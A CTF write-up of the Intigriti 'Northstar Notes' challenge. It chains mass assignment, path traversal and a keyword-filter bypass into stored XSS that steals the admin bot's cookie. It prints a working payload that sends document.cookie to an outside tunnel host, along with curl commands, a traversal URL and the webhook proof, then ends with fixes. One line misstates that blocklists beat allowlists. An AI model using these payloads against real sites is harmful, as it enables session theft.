---
title: "Northstar Notes CTF Writeup"
date: "2026-04-28"
tags: ["CTF", "Security", "Web"]
author: "Aceproulx"
---

# The Triple Hijack: How I Chained Three "Almost" Bugs Into Admin Cookie Theft

**Challenge:** Intigriti April 2026 XSS Challenge — *Northstar Notes*
**URL:** https://challenge-0426.intigriti.io
**Type:** Stored XSS → Admin Session Hijack
**Difficulty:** Hard
**Flag:** `INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}`

---

## To begin with

I almost gave up on this one.

I had been staring at the sanitization logic in `app.js` for a while, thinking the entrypoint was the note content. DOMPurify, a custom regex filter on top—it felt like someone had really done their homework. Then I looked at the URL path and it clicked.

The panel name in the URL was being injected *raw* into `window.__APP_INIT__.panel`. And the app was using that panel name to fetch a manifest. What if I could make the app fetch *my* manifest? The one that tells it `renderMode: "full"`. The one that opens the door.

That's when I saw the chain.

---

## Context: What Are We Working With?

Northstar Notes is a simple note-sharing app. You write notes, share them publicly, and there's an admin bot that will visit any URL you report to it. Classic XSS challenge setup — get the bot to execute your JavaScript, steal its cookie, grab the flag.

The defenses look solid on the surface:
- **DOMPurify** is used to sanitize note content before rendering
- A custom **`postSanitize()`** function strips `data-*` attributes containing dangerous keywords
- A **Content Security Policy (CSP)** restricts script sources
- An enhancement system ("widgets") exists, but is gated behind `renderMode: "full"`, which defaults to `"safe"`

Your mission: get `renderMode` set to `"full"` for the admin bot, inject a note that escapes sanitization, and exfiltrate the cookie. Sounds simple when I say it like that.

---

## The Vulnerability Chain

There are three separate pieces here. None of them work alone. Together, they're devastating.

### Piece 1: The Preferences API Lets You Set Anything

When I first poked at the preferences a request was sent to `/api/account/preferences` which only showed the basic settings: theme, font size, language. But then I noticed a reference in `app.js` to a `readerPresets` object. I fired a POST at the preferences endpoint with a body the UI never showed me:

```json
POST /api/account/preferences
Cookie: northstar_profile=<your_session>

{
  "readerPresets": {
    "exploit": {
      "profile": {
        "renderMode": "full",
        "widgetSink": "script",
        "widgetTypes": ["custom"]
      }
    }
  }
}
```

And it just... worked. `{"success":true,"presetCount":1}`. No validation. No allowlist. No "you can't set `widgetSink` to `script` from the API."

This is a **Mass Assignment** vulnerability — the server blindly accepts more fields than it exposes in the UI. The frontend form only shows you theme, font size, language. But the backend happily stores anything you send it.

Think of it like a hotel check-in form that only shows "Name" and "Room Type" — but if you sneak `"minibarAccess": true` into the JSON body, the server adds it to your reservation anyway.

At this point I had a preset named `exploit` in my account that, if loaded, would set `renderMode` to `"full"`. But the key question was: how do I make the admin bot load *my* preset?

---

### Piece 2: The URL Path Is Trusted Too Much

Let me show you the relevant chunk from `app.js`. This is `loadPanelManifest()`, which runs on every note page:

```javascript
function loadPanelManifest() {
  var panel = typeof APP.panel === 'string' 
    ? APP.panel.toLowerCase().trim() 
    : 'summary';
  var noteId = typeof APP.noteId === 'string' ? APP.noteId : '';

  var target = '/note/' + encodeURIComponent(noteId) + '/' + panel +
    '/manifest.json?note=' + encodeURIComponent(noteId);

  return fetch(target, { headers: { 'Accept': 'application/json' } })
    .then(function (r) {
      if (!r.ok) {
        if (!isBuiltinPanel(panel)) {
          return loadReaderPresetTheme(noteId, panel); // ← Fallback!
        }
        return null;
      }
      return r.json();
    })
    .then(function (data) {
      if (data && data.profile) {
        applyRemoteProfile(data.profile); // ← Full profile applied!
      }
    });
}
```

Here's what jumped out at me. The `panel` variable comes from `APP.panel`. And `APP.panel` is populated by the server, which injects it from the last segment of the URL path into `window.__APP_INIT__`.

So if I visit `/note/[ID]/exploit`, the server sets `panel: "exploit"`.

Now the app tries to fetch `/note/[ID]/exploit/manifest.json`. If the panel is not a builtin (`summary`, `print`, `compact`) and the manifest fetch fails, it calls `loadReaderPresetTheme()`. And here's the really important part — that fallback is *intentionally limited*. Let me show you:

```javascript
function loadReaderPresetTheme(noteId, presetName) {
  var target = READER_PRESETS_API + '/' + encodeURIComponent(presetName) +
    '/manifest.json?note=' + encodeURIComponent(noteId);
  
  // ...fetch...
  .then(function (data) {
    // ⚠️ Fallback preset loading only applies theme to keep rich rendering gated.
    if (typeof data.profile.theme === 'string') {
      APP.theme = data.profile.theme; // Only theme, nothing else!
    }
  });
}
```

The comment literally says "to keep rich rendering gated." So if you hit `/note/[ID]/exploit`, the app loads your preset manifest but *only applies the `theme` property*. `renderMode`, `widgetSink`, `widgetTypes` — all ignored.

Smart. Except...

What if I skip the fallback entirely? What if I make the *primary* manifest fetch succeed — but point it at my preset API directly?

That's where path traversal comes in.

When I visited:
```
/note/[NOTE_ID]/..%2f..%2fapi%2faccount%2fpreferences%2freader-presets%2fexploit
```

The server reflected this path segment *verbatim* into `APP.panel`. So the app tried to fetch:
```
/note/[NOTE_ID]/../../api/account/preferences/reader-presets/exploit/manifest.json
```

Which the browser resolved to:
```
/api/account/preferences/reader-presets/exploit/manifest.json
```

And that endpoint returned:
```json
{
  "profile": {
    "renderMode": "full",
    "widgetSink": "script",
    "widgetTypes": ["custom"]
  }
}
```

HTTP 200. `data.profile` exists. `applyRemoteProfile()` gets called — the full version, not the lobotomized fallback. `renderMode` becomes `"full"`.

The door is open.

---

### Piece 3: The Regex That Thinks It's Smarter Than It Is

Now with `renderMode: "full"`, DOMPurify's configuration relaxes. `id` attributes are allowed. `data-*` attributes are allowed. The enhancement system activates.

Here's how the enhancement system works when it's fully enabled. The app looks for elements with `data-enhance="custom"` and passes them to `loadCustomWidget()`:

```javascript
function loadCustomWidget(el) {
  if (getOwnString(APP, 'widgetSink', 'text') !== 'script') return;

  var cfg = el.dataset.cfg;
  if (!cfg || cfg.length > 512) return;
  var s = document.createElement('script');
  s.textContent = cfg; // ← Just puts it directly into a script tag
  document.head.appendChild(s);
}
```

Yep. Whatever is in `data-cfg` gets executed as JavaScript. This is the sink.

But before we get there, the note content goes through two sanitization layers. DOMPurify handles tag and attribute whitelisting. Then a custom `postSanitize()` function runs a regex over every `data-*` attribute value:

```javascript
var UNSAFE_CONTENT_RE = /script|cookie|document|window|eval|alert|prompt|confirm|Function|fetch|XMLHttp|import|require|setTimeout|setInterval/i;

function postSanitize(html) {
  var temp = document.createElement('div');
  temp.innerHTML = html;
  temp.querySelectorAll('*').forEach(function (el) {
    var attrs = el.attributes;
    for (var i = attrs.length - 1; i >= 0; i--) {
      var attr = attrs[i];
      if (attr.name.indexOf('data-') === 0 && UNSAFE_CONTENT_RE.test(attr.value)) {
        el.removeAttribute(attr.name); // Strips the attribute
      }
    }
  });
  return temp.innerHTML;
}
```

This regex is checking the *literal string* stored in the HTML attribute. It's looking for consecutive characters: `c-o-o-k-i-e`, `d-o-c-u-m-e-n-t`, `f-e-t-c-h`.

The bypass is almost embarrassingly simple. JavaScript evaluates string concatenation at runtime, *after* the attribute is parsed. So:

```javascript
// This IS caught:
fetch('...')

// This IS NOT caught:
top['fe'+'tch']('...')
```

The regex sees `fe'+'tch` in the attribute string — the characters `f-e-'-'-+-'-t-c-h`. There's no consecutive `f-e-t-c-h`. Regex returns false. Attribute survives.

The same trick works for `document` → `'docu'+'ment'` and `cookie` → `'coo'+'kie'`.

So my final note content looked like this:

```html
<div id="enhance-config" data-types="custom"></div>
<div 
  data-enhance="custom" 
  data-cfg="top['fe'+'tch']('https://captain-seen-removal-myth.trycloudflare.com/?c='+btoa(top['docu'+'ment']['coo'+'kie']))">
</div>
```

Clean. No blocked words. Passes both DOMPurify and `postSanitize`. Executes on load.

---

## The Full Exploit Chain, Assembled

Here's the complete picture step by step:

![Attack Summary Diagram](/attack_summary.png)

---

## The Full Payload

**Step 1 — Create the preset:**
```bash
curl -X POST https://challenge-0426.intigriti.io/api/account/preferences \
  -H 'Content-Type: application/json' \
  -H 'Cookie: northstar_profile=<YOUR_COOKIE>' \
  -d @preset.json
```

`preset.json`:
```json
{
  "readerPresets": {
    "exploit": {
      "profile": {
        "renderMode": "full",
        "widgetSink": "script",
        "widgetTypes": ["custom"]
      }
    }
  }
}
```

**Step 2 — Create the note:**
```bash
curl -X POST https://challenge-0426.intigriti.io/api/notes \
  -H 'Content-Type: application/json' \
  -H 'Cookie: northstar_profile=<YOUR_COOKIE>' \
  -d @note.json
```

`note.json`:
```json
{
  "title": "Security Review",
  "content": "<div id=\"enhance-config\" data-types=\"custom\"></div><div data-enhance=\"custom\" data-cfg=\"top['fe'+'tch']('https://YOUR-EXFIL-URL/?c='+btoa(top['docu'+'ment']['coo'+'kie']))\"></div>"
}
```

**Step 3 — Trigger the bot:**
Report the following URL:
```
/note/[NOTE_ID]/..%2f..%2fapi%2faccount%2fpreferences%2freader-presets%2fexploit
```

---

## Reproduction Steps

1. Grab a cookie from the challenge site
2. POST to `/api/account/preferences` with the `readerPresets.exploit` payload above
3. Verify your preset was stored: GET `/api/account/preferences` and check `readerPresets`
4. POST to `/api/notes` with the XSS payload note content
5. Note the `id` field from the response (e.g., `3ae9d7ea...`)
6. Set up a webhook (e.g., Burp Collaborator, interactsh, or a cloudflare tunnel + simple HTTP server)
7. POST to `/api/report` with the URL: `/note/[ID]/..%2f..%2fapi%2faccount%2fpreferences%2freader-presets%2fexploit`
8. Watch your webhook for an incoming GET request with a `?c=` parameter
9. Base64-decode the `c` value to get the admin's cookie (and flag!)

---

## Proof

Incoming request on the webhook:

```http
GET /?c=ZmxhZz1JTlRJR1JJVEl7MDE5ZDk1NWYtMTY0My03N2E2LTk5ZWYtMWMxMDk3NWFiMjg0fTsge... HTTP/2.0
Host: captain-seen-removal-myth.trycloudflare.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) ... HeadlessChrome/147.0.0.0 Safari/537.36
Origin: http://127.0.0.1:3000
```

Decode the base64:
```
flag=INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}; northstar_profile=6f557603...
```

🚩 **Flag: `INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}`**

---

## Rabbit Holes (The Part Nobody Talks About)

### Rabbit Hole 1: Trying to Inject renderMode via the URL Directly

My first instinct was to try JSON injection through the panel path. Since the server was injecting the panel name into the JSON-like `__APP_INIT__` object, I wondered if I could break out of the string:

```
/note/[ID]/summary","renderMode":"full
```

Didn't work. The server properly escapes the panel value before embedding it in the HTML, so the double quotes got turned into `&quot;` or `\"`. Back to the drawing board.

### Rabbit Hole 2: Trusting loadReaderPresetTheme to Do More

Before I found the path traversal, I spent a while trying to make `loadReaderPresetTheme()` apply the full profile. I thought maybe there was a way to make the primary manifest fetch fail gracefully while still loading through the fallback.

The problem is that comment in the source code — `// Fallback preset loading only applies theme to keep rich rendering gated.` — is actually enforced. The code deliberately only reads `data.profile.theme`. There's no bug there to exploit. Time wasted: about 30 minutes of going in circles.

### Rabbit Hole 3: The `__proto__` Trick

I noticed the original exploit script (from a previous attempt) tried using `/__proto__` as the panel name to do prototype pollution. The idea was that if `APP.panel = "__proto__"`, then operations on `APP.panel` might pollute `Object.prototype`. 

But the client-side code uses `getOwnString()` which calls `Object.prototype.hasOwnProperty.call(obj, key)`, and the server manifest endpoint returns `{}` for unknown panels. `applyRemoteProfile({})` with no `profile` key does nothing. Dead end.

### Rabbit Hole 4: Trying `sendBeacon` and `XMLHttpRequest`

My first exfiltration attempt used `navigator.sendBeacon()`. That's blocked — `sendBeacon` isn't in the blocklist, but the browser's CSP blocks outbound beacon requests in this context. I switched to `fetch()` with string concatenation and it worked fine. (Note: `XMLHttp` is in the blocklist, so `XMLHttpRequest` is also out.)

---

## What Made This Challenge Interesting

This chain was clever specifically because each individual vulnerability looks almost harmless in isolation.

- An API that stores extra fields? Meh, it's your own preferences.
- A path segment reflected into a JS variable? Server-side path normalization would neutralize it.
- A regex that checks for keywords? Sounds reasonable.
- A custom widget system? Only works in "full" mode, which is gated.

None of these are immediately alarming on their own. Together they form something critical. This is the real lesson of chains like this: **security review a system, not just its components.**

The `postSanitize` regex is also a great lesson in why blocklists beat allowlists: there will always be an encoding, a concatenation, a unicode trick, or a browser quirk that renders a blocklist incomplete. Allowlists tell the system what *is* safe. Blocklists try to enumerate everything that *isn't* — an impossible task.

---

## How to Fix Each Vector

### Fix 1: Validate Panel Names on the Server (Path Traversal)

The server should sanitize the panel segment before reflecting it into `__APP_INIT__`. A simple allowlist or strict regex is enough:

```javascript
// Before injecting into __APP_INIT__, validate strictly
const VALID_PANEL_RE = /^[a-zA-Z0-9_-]{1,64}$/;
if (!VALID_PANEL_RE.test(panel)) {
    panel = 'summary';
}
```

This kills the path traversal because `..%2f..%2fapi...` contains `/` which wouldn't match.

### Fix 2: Restrict What the Preferences API Accepts (Mass Assignment)

The server should explicitly allowlist the fields it accepts in each preference POST:

```javascript
// Only accept known, safe fields from preferences POST body
const ALLOWED_PRESET_PROFILE_FIELDS = ['theme']; // Not renderMode, widgetSink, etc.
```

Or better, don't expose `renderMode` and `widgetSink` as user-controllable preferences at all. If they need to exist, they should be server-side computed values, not stored user input.

### Fix 3: Replace the Regex Sanitizer With a Real Parser (Sanitization)

The `postSanitize` regex is fundamentally broken by design. You cannot reliably block JavaScript execution via string matching because JavaScript can always be obfuscated. The fix is to not allow arbitrary JavaScript in `data-cfg` at all.

If the widget system genuinely needs dynamic content, restrict `data-cfg` to a **declarative JSON config** format, not raw executable code:

```javascript
// Instead of executing data-cfg as JS:
var cfg = el.dataset.cfg;
var s = document.createElement('script');
s.textContent = cfg; // ← Dangerous!

// Parse it as a config object:
var config = JSON.parse(el.dataset.cfg);
runWidget(el, config); // Widget reads fields, not executes strings 
```

### Fix 4: Set Cookies as httpOnly

The final kicker — `document.cookie` worked because the `northstar_profile` cookie lacked the `httpOnly` flag. Setting `httpOnly: true` means even successful XSS can't read session cookies, turning this from an account takeover into a much lower-impact finding.

---

## Closing Thoughts

Chains like this remind me why I enjoy CTFs. The challenge author designed real-looking defenses — not obvious pitfalls. Each individual security measure had a clear intent. But intent doesn't equal implementation, and three partial measures with gaps between them is worse than one solid one.

My biggest takeaway from this challenge is to always look at *how* state is loaded, not just *what* it contains. The note content being sanitized was the obvious target. The manifest system loading the rendering configuration was the real attack surface — and it was wide open once I understood the routing logic.

Thanks to the Intigriti team for another great monthly challenge. These are genuinely some of the most creative and educational puzzles in the bug bounty world.

If you've got questions about the chain or want to dig deeper into any of the techniques, hit me up.

---

